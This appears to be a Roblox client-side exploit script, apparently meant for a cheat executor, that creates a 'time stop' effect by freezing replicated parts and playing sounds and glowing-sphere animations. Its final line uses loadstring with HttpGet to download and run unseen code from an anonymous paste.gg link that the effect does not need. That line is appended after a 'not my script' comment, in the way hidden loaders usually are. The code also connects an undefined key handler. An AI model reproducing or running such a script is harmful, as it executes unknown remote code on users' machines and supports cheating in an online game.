local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local char = player.Character
local chara = game:GetService("Players").LocalPlayer.Character 
local head = char.Head
local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
local root = char.HumanoidRootPart
local humanoid = char.Humanoid

local playerhealth = humanoid.Health

local mouse = player:GetMouse()

local tween = game:GetService("TweenService")
local lighting = game:GetService("Lighting")
local input = game:GetService("UserInputService")

local frozenobjectstable = {}

seconds = 10

stoppedtime = false

local timestopeffect = Instance.new("ColorCorrectionEffect")
timestopeffect.Parent = lighting
timestopeffect.Saturation = 0
timestopeffect.Contrast = 0
timestopeffect.Enabled = true

local timestopvoiceline = Instance.new("Sound", head)
timestopvoiceline.SoundId = "rbxassetid://6667923288"
timestopvoiceline.Volume = 5

local timeresumevoiceline = Instance.new("Sound", head)
timeresumevoiceline.SoundId = "rbxassetid://6864673277"
timeresumevoiceline.Volume = 5

local clock = Instance.new("Sound", workspace)
clock.SoundId = "rbxassetid://4940109913"
clock.Volume = 2.5
clock.Looped = true

local CHARACTER_DISTANCE = 48.5
local ANGLE_INCREMENT = 10
local SCALE_START = Vector3.new(1, 1, 1) 
local SCALE_END = Vector3.new(10, 10, 10)
local SCALE_FIN = Vector3.new(0, 0, 0)
local GLOW_COLOR_START = Color3.fromRGB(255, 255, 255) 
local GLOW_COLOR_END = Color3.new(0, 0, 0)
local GLOW_RANGE = 30

function timestop()
    if stoppedtime == true then return end
    stoppedtime = true
    timestopvoiceline:Play()
    
    settings().Network.IncomingReplicationLag = math.huge
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            if not v.Anchored == true then
                if not v:IsDescendantOf(char) then
                    v.Anchored = true
                    table.insert(frozenobjectstable, v)
                end
            end
        end
    end
    
    local function createWhiteStud(position, rotation, delay)
        spawn(function()
            wait(delay)
            local part = Instance.new("Part")
            part.Size = SCALE_START
            part.Color = Color3.new(1, 1, 1)
            part.Position = position
            part.CFrame = rotation
            part.Anchored = true
            part.CanCollide = false
            part.Parent = game.Workspace
            part.Name = "wawa"

            local glow = Instance.new("SurfaceLight")
            glow.Color = GLOW_COLOR_START
            glow.Brightness = 50
            glow.Range = GLOW_RANGE
            glow.Shadows = true
            glow.Parent = part

            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
            local tween = game.TweenService:Create(part, tweenInfo, {Size = SCALE_END})
            tween:Play()
        end)
    end

    local function createSphereFormation()
        local character = game.Players.LocalPlayer.Character
        if not character then
            return
        end

        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local position = humanoidRootPart.Position

        for angleX = -90, 90, ANGLE_INCREMENT do
            for angleY = 0, 360, ANGLE_INCREMENT do
                local radianX = math.rad(angleX)
                local radianY = math.rad(angleY)

                local xOffset = math.cos(radianX) * math.cos(radianY) * CHARACTER_DISTANCE
                local yOffset = math.sin(radianX) * CHARACTER_DISTANCE
                local zOffset = math.cos(radianX) * math.sin(radianY) * CHARACTER_DISTANCE

                local newPosition = position + Vector3.new(xOffset, yOffset, zOffset)
                local lookVector = (position - newPosition).unit
                local rotation = CFrame.new(newPosition, newPosition + lookVector)
                local delay = ((position - newPosition).magnitude / CHARACTER_DISTANCE) * 0.5
                createWhiteStud(newPosition, rotation, delay)
            end
        end
    end

    createSphereFormation()

    wait(4)

    for _, part in ipairs(game.Workspace:GetChildren()) do
        if part.Name == "wawa" then
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
            local tween = game.TweenService:Create(part, tweenInfo, {Color = GLOW_COLOR_END})
            tween:Play()
            tween.Completed:Connect(function()
            end)
        end
    clock:Play()
    end
end



function timeresume()
    if stoppedtime == false then return end
    stoppedtime = false
    timeresumevoiceline:Play()
    wait(3.7)
    settings().Network.IncomingReplicationLag = 0
    for _, v in pairs(frozenobjectstable) do
        if v:IsA("BasePart") then
            v.Anchored = false
        end
    end

    clock:Stop()

    for _, part in ipairs(game.Workspace:GetChildren()) do
        if part.Name == "wawa" then
            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
            local tween = game.TweenService:Create(part, tweenInfo, {Size = SCALE_FIN})
            tween:Play()
            tween.Completed:Connect(function()
                part:Destroy()
            end)
        end
    end
    
    stoppedtime = false
end


game:GetService("UserInputService").InputBegan:Connect(onKeyPress)

mouse.KeyDown:Connect(function(key)
    if key == "g" and stoppedtime == false then
        timestop()
    elseif key == "g" and stoppedtime == true then
        timeresume()
    end
end)

_G.key = Enum.KeyCode.G
-- not my script


loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()
